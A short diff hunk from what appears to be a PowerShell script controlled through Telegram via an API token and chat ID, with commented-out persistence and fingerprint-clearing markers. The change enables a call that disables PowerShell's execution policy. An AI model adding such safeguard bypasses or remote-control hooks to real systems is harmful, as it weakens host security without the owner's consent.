@@ -44,7 +44,7 @@ $commandlist=@('account_replicator')
 $GLOBAL:joblist=@{}
 #persistence
 #Clear-Fingerprints
-#Disable-ExecutionPolicy
+Disable-ExecutionPolicy
 
 New-MyTelegramConfiguration -ApiToken $ApiToken -ChatID $ChatID
 
